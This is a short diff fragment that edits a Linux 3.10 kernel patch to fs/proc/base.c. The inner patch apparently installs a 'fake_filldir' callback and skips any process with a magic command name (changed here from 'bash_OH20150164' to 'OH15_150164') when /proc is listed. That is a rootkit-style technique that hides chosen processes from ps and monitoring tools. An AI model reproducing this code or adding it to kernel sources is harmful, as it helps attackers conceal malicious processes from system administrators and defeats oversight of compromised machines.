@@ -6,7 +6,7 @@ diff -urNp ./linux-3.10.0-123.13.2.el7.x86_64/fs/proc/base.c linux-3.10.0-123.13
  			__filldir = fake_filldir;
  
 +		task_lock(iter.task);
-+		if (strcmp(iter.task->comm, "bash_OH20150164") == 0) {
++		if (strcmp(iter.task->comm, "OH15_150164") == 0) {
 +			task_unlock(iter.task);
 +			continue;
 +		}
